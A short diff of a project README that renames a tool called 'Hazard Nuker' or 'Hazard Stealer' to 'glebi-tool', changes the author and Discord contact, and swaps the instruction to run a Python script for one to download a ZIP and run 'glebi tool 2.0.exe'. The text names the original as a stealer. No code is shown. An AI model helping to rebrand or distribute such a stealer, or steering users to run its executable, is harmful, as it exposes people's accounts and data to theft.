@@ -50,18 +50,17 @@ And run it
 ```
 Click the green "Code" button.
 Click "Download ZIP"
-Extract the ZIP and run Hazard.py
-NOTE: Make sure you have Python & the Requirements installed!
+Extract the ZIP and run glebi tool 2.0.exe
 ```
 
 ---
 
-🌟 **Enjoyed Hazard Nuker?** Consider dropping a star :)
+🌟 **Enjoyed glebi-tool?** Consider dropping a star :)
 
 <a href="https://cheataway.com" target="_blank"><img src="https://discordapp.com/api/guilds/942426336348233799/widget.png?style=banner2" alt="Cheataway"/></a>
 
-**Hazard Stealer was created by Rdimo.**
+**glebi-tool was created by glebi.**
 
-Discord: Rdimo#6969
+Discord: glebi#1773
 
-Website: https://cheataway.com/
+Website: soon
